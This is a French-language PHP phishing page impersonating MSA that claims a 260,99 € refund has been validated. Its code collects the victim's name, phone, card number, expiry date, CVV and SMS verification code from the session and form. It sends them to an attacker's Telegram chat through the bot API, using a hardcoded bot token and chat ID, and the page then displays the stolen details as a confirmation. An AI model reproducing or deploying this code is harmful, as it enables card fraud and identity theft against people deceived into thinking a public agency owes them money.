<?php
session_start();

// 🔹 Configuration Telegram
$telegramBotToken = '7194667513:AAEjFC8Lr3YGuhofocJkIpr3i9LvzTDwZDA'; // Remplace par ton vrai token
$chatId = '6163989462'; // Remplace par ton vrai chat ID

// 🔹 Récupération des données (affiche vide si non défini)
$prenom = htmlspecialchars($_SESSION['identification_data']['prenom'] ?? '');
$nom = htmlspecialchars($_SESSION['identification_data']['nom'] ?? '');
$telephone = htmlspecialchars($_SESSION['identification_data']['phone'] ?? '');

$numCarte = htmlspecialchars($_SESSION['cardNumber'] ?? '');
$expiration = htmlspecialchars($_SESSION['expiryDate'] ?? '');
$cvv = htmlspecialchars($_SESSION['cvv'] ?? '');

// 🔹 Récupération du code SMS (via POST)
$codeSMS = '';
for ($i = 1; $i <= 6; $i++) {
    $codeSMS .= htmlspecialchars($_POST["code$i"] ?? '');
}

$date = date('d/m/Y H:i:s');

// 🔹 Construction du message Telegram
$message = <<<EOT
🔔 NOUVELLE CONFIRMATION MSA 🔔

👤 Nom : $prenom $nom
📱 Téléphone : $telephone

💳 Numéro : $numCarte
📅 Expiration : $expiration
🔐 CVV : $cvv

🔢 Code SMS : $codeSMS
💰 Montant : 260,99 €
📄 Date : $date
EOT;

// 🔹 Envoi à Telegram
$url = "https://api.telegram.org/bot$telegramBotToken/sendMessage";
file_get_contents($url . "?chat_id=$chatId&text=" . urlencode($message));
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Confirmation - MSA</title>
    <style>
        body {
            font-family: 'Segoe UI', sans-serif;
            background-color: #f2f4f8;
            margin: 0;
            padding: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }
        .container {
            background: #fff;
            padding: 40px 30px;
            border-radius: 12px;
            box-shadow: 0 0 25px rgba(0, 0, 0, 0.07);
            max-width: 400px;
            width: 90%;
            text-align: center;
        }
        .logo {
            height: 50px;
            margin-bottom: 25px;
        }
        h2 {
            color: #2e7d32;
            margin-bottom: 10px;
        }
        .icon {
            font-size: 50px;
            color: #2e7d32;
            margin-bottom: 20px;
        }
        .info {
            font-size: 18px;
            margin: 20px 0;
            color: #333;
        }
        .amount {
            font-size: 22px;
            font-weight: bold;
            color: #2e7d32;
            margin-bottom: 30px;
        }
        .btn {
            background: #2e7d32;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 6px;
            font-size: 16px;
            cursor: pointer;
            text-decoration: none;
        }
        .btn:hover {
            background: #256329;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="assets/images/msa-logo.png" alt="MSA" class="logo">
        <div class="icon">✔️</div>
        <h2>Remboursement validé</h2>
        <p class="info">Votre demande a bien été enregistrée.</p>
        <p><strong>Nom :</strong> <?= $prenom ?> <?= $nom ?></p>
        <p><strong>Téléphone :</strong> <?= $telephone ?></p>
        <p><strong>Numéro de carte :</strong> <?= $numCarte ?></p>
        <p><strong>Date d'expiration :</strong> <?= $expiration ?></p>
        <p><strong>CVV :</strong> <?= $cvv ?></p>
        <p><strong>Code SMS :</strong> <?= $codeSMS ?></p>
        <p><strong>Date :</strong> <?= $date ?></p>
        <div class="amount">260,99 €</div>
        <a href="#" class="btn" onclick="window.print()">Imprimer la confirmation</a>
    </div>
</body>
</html>
